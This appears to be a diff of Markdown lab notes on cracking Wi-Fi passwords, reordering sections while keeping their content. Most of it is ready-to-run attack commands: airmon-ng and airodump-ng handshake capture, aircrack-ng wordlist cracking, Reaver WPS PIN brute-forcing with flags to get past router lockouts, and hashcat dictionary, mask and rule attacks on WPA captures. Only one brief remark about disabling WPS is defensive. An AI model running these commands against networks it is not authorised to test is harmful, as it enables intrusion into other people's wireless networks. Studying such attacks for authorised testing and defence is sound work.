@@ -62,43 +62,6 @@ sudo aircrack-ng -a2 -w ~/new-list2.txt New-01.cap
 ```
 
 
-# clean up cap to convert
-```
-wpaclean clean.cap original.cap 
-```
-# convert to use hashcat 
-### make hccapx
-```
-aircrack-ng -j clean clean.cap
-```
-### make hccap
-```
-aircrack-ng -J clean clean.cap
-```
-
-# Dictionaries:
-1. https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
-2. https://wiki.skullsecurity.org/Passwords
-3. https://haveibeenpwned.com/Passwords
-
-# Hashcat
-### Dictionary Attack
-```
-hashcat -m 2500 capture.hccapx wordlist.txt
-```
-### Brute-Force Attack
-```
-hashcat -m 2500 -a3 capture.hccapx ?d?d?d?d?d?d?d?d
-hashcat -m 2500 -a3 capture.hccapx ?h?h?h?h?h?h?h?h
-hashcat -m 2500 -a3 capture.hccapx ?H?H?H?H?H?H?H?H
-```
-### Rule Based Attack
-```
-hashcat -m 2500 -r rules/best64.rule capture.hccapx wordlist.txt
-```
-
-
-
 
 # Packet monitoring and injection mode
 Once we started KALI on VituralBox, the first thing we did was to map the 2200mW NextG USB-Yagi TurboTenna as the USB Device by selecting "Ralink 802.11 n WLAN [0101]"
@@ -116,81 +79,6 @@ airmon-ng check
 airmon-ng start wlan0
 
 airodump-ng wlan0mon
-```
-
-# REAVER - WPS Pin Attack
-
-WiFi Protected Setup (WPS) is a convenient feature that allows the user to configure a client device against a wireless network by simultaneously pressing a button on both the WiFi router and the client device (the client side “button” is often in software) at the same time. The devices exchange information, and then set up a secure WPA link.
-
-Reaver was designed to brute-force the WPA handshaking process remotely, even if the physical WPS button hadn’t been pressed on the WiFi router.
-
-While some newer devices are building in protection against this specific attack, the Reaver WPS exploit remains useful on many networks in the field.
-
-In particular, WPS is the vulnerable system in this case, not WPA. If a network has WPS disabled (which they should, given the existence of tools such as this), it will be immune to the following attack.
-
-To generate a list of WiFi networks that shows the status of WPS Locked:
-```
-wash -i wlan0mon
-```
-The “WPS Locked” column in the list is far from a definitive indicator, but those WPS Unlocked WiFi networks are much more susceptible to brute forcing.
-
-To launch Reaver against WiFi network with <BSSID> 11:22:33:44:55:66 :
-```
-reaver -i wlan0mon -b 11:22:33:44:55:66 -vv -K 1
-```
-It may take several hours and perhaps even longer to run because better designed WiFi router are getting smarter in terms of rejecting repeated attacks, longer and irregular timeout periods, illogical checksum and NULL pin.
-
-Ideally, the above command works and the attack progresses as expected. But in reality, manufacturers implement smarter protections against Reaver-style attacks, and additional options may be required to get the attack moving.
-
-As a countermeasure, a few optional switches can be added to get Reaver working on more picky devices:
-```
-reaver -i wlan0mon -c 11 -b 11:22:33:44:55:66 -vv -L -N -d 10 -T .5 -r 4:20
-```
-where
-
--c 11is channel 11
-
--L ignores locked WPS state
-
--N Don't send NACK packets when errors are detected
-
--d 10 Delay 10 seconds between PIN attempts
-
--T .5 sets timeout period to half a second
-
--r 4:20 after 4 attempts, sleep for 20 seconds
-
-Simply type reaver if you to look for more options to experiment:
-
-reaver
-
-Reaver is armed with a pin "12345670" that appears not changing but in fact it is the starting point followed by subsequent variations to attack the router. Knowing that it is only a matter of time to strike a successful hit, clever designers put a NULL pin for which the traditional Reaver programmer had never expected. A patched version of reaver-wps-fork-t6x emerged in 2017 in the light of combating the NULL pin.
-
-Installation was pretty straight forward on a newly created Reaver diractory:
-```
-mkdir reaver
-
-cd reaver
-
-git clone https://github.com/t6x/reaver-wps-furk-t6x.git
-
-apt-get install -y libpcap-dev
-
-cd src
-
-./configure
-
-make && make install
-```
-The -p option becomes available to foster a NULL pin or a digit sequence of various lengths.
-
-NULL pin:
-```
-reaver -i wlan0mon -b 11:22:33:44:55:66 -vv -K 1 -p ""
-```
-Pin with a length of 4 digits:
-```
-reaver -i wlan0mon -b 11:22:33:44:55:66 -vv -K 1 -p "4321"
 ```
 
 
@@ -267,6 +155,125 @@ sudo airodump-ng wlan0mon -c 6 & wireshark
 4. exit wireshark and airdump-ng
 5. crack the password
 	- ``` aircrack-ng -w '/usr/share/wordlists/rockyou.txt' '/path/to/pcap-file' ```
+
+
+	
+	
+# REAVER - WPS Pin Attack
+
+WiFi Protected Setup (WPS) is a convenient feature that allows the user to configure a client device against a wireless network by simultaneously pressing a button on both the WiFi router and the client device (the client side “button” is often in software) at the same time. The devices exchange information, and then set up a secure WPA link.
+
+Reaver was designed to brute-force the WPA handshaking process remotely, even if the physical WPS button hadn’t been pressed on the WiFi router.
+
+While some newer devices are building in protection against this specific attack, the Reaver WPS exploit remains useful on many networks in the field.
+
+In particular, WPS is the vulnerable system in this case, not WPA. If a network has WPS disabled (which they should, given the existence of tools such as this), it will be immune to the following attack.
+
+To generate a list of WiFi networks that shows the status of WPS Locked:
+```
+wash -i wlan0mon
+```
+The “WPS Locked” column in the list is far from a definitive indicator, but those WPS Unlocked WiFi networks are much more susceptible to brute forcing.
+
+To launch Reaver against WiFi network with <BSSID> 11:22:33:44:55:66 :
+```
+reaver -i wlan0mon -b 11:22:33:44:55:66 -vv -K 1
+```
+It may take several hours and perhaps even longer to run because better designed WiFi router are getting smarter in terms of rejecting repeated attacks, longer and irregular timeout periods, illogical checksum and NULL pin.
+
+Ideally, the above command works and the attack progresses as expected. But in reality, manufacturers implement smarter protections against Reaver-style attacks, and additional options may be required to get the attack moving.
+
+As a countermeasure, a few optional switches can be added to get Reaver working on more picky devices:
+```
+reaver -i wlan0mon -c 11 -b 11:22:33:44:55:66 -vv -L -N -d 10 -T .5 -r 4:20
+```
+where
+
+-c 11is channel 11
+
+-L ignores locked WPS state
+
+-N Don't send NACK packets when errors are detected
+
+-d 10 Delay 10 seconds between PIN attempts
+
+-T .5 sets timeout period to half a second
+
+-r 4:20 after 4 attempts, sleep for 20 seconds
+
+Simply type reaver if you to look for more options to experiment:
+
+reaver
+
+Reaver is armed with a pin "12345670" that appears not changing but in fact it is the starting point followed by subsequent variations to attack the router. Knowing that it is only a matter of time to strike a successful hit, clever designers put a NULL pin for which the traditional Reaver programmer had never expected. A patched version of reaver-wps-fork-t6x emerged in 2017 in the light of combating the NULL pin.
+
+Installation was pretty straight forward on a newly created Reaver diractory:
+```
+mkdir reaver
+
+cd reaver
+
+git clone https://github.com/t6x/reaver-wps-furk-t6x.git
+
+apt-get install -y libpcap-dev
+
+cd src
+
+./configure
+
+make && make install
+```
+The -p option becomes available to foster a NULL pin or a digit sequence of various lengths.
+
+NULL pin:
+```
+reaver -i wlan0mon -b 11:22:33:44:55:66 -vv -K 1 -p ""
+```
+Pin with a length of 4 digits:
+```
+reaver -i wlan0mon -b 11:22:33:44:55:66 -vv -K 1 -p "4321"
+```
+
+
+
+
+# clean up cap to convert
+```
+wpaclean clean.cap original.cap 
+```
+# convert to use hashcat 
+### make hccapx
+```
+aircrack-ng -j clean clean.cap
+```
+### make hccap
+```
+aircrack-ng -J clean clean.cap
+```
+
+# Dictionaries:
+1. https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
+2. https://wiki.skullsecurity.org/Passwords
+3. https://haveibeenpwned.com/Passwords
+
+# Hashcat
+### Dictionary Attack
+```
+hashcat -m 2500 capture.hccapx wordlist.txt
+```
+### Brute-Force Attack
+```
+hashcat -m 2500 -a3 capture.hccapx ?d?d?d?d?d?d?d?d
+hashcat -m 2500 -a3 capture.hccapx ?h?h?h?h?h?h?h?h
+hashcat -m 2500 -a3 capture.hccapx ?H?H?H?H?H?H?H?H
+```
+### Rule Based Attack
+```
+hashcat -m 2500 -r rules/best64.rule capture.hccapx wordlist.txt
+```
+
+
+
 
 
 	
